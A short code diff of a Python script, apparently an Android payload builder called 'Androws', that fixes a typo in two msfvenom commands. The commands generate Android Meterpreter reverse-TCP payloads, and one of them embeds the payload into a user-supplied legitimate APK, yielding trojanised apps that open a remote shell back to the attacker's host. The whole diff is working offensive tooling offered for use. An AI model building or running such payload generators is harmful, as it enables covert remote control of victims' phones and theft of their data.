@@ -201,7 +201,7 @@ def main():
                 print("LPORT FOR PAYLOAD :"  +vLport)
                 vName = input("VDROID==>[Name] ")
                 print("NAME FOR PAYLOAD :"  +vName)
-                Vdroidp = 'msfvenom -p android/meterpreter/rverse_tcp LHOST='+vLhost+' LPORT='+vLport+' -o output/'+vName+'.apk'
+                Vdroidp = 'msfvenom -p android/meterpreter/reverse_tcp LHOST='+vLhost+' LPORT='+vLport+' -o output/'+vName+'.apk'
                 os.system(Vdroidp)
                 os.system("mv "+vName+".apk output/")
                 os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
@@ -287,7 +287,7 @@ def main():
                 vName100 = input("VDROID==>[Name] ")
                 print("NAME FOR PAYLOAD :"  +vName100)
                 Vpath100 = input("VDROID==>[PATH FOR APK FILE] ")
-                Vdroidp100 = 'msfvenom -x '+Vpath100+' -p android/meterpreter/rverse_tcp LHOST='+vLhost100+' LPORT='+vLport100+' -o output/'+vName100+'.apk'
+                Vdroidp100 = 'msfvenom -x '+Vpath100+' -p android/meterpreter/reverse_tcp LHOST='+vLhost100+' LPORT='+vLport100+' -o output/'+vName100+'.apk'
                 os.system(Vdroidp100)
                 os.system("mv "+vName100+".apk output/")
                 os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
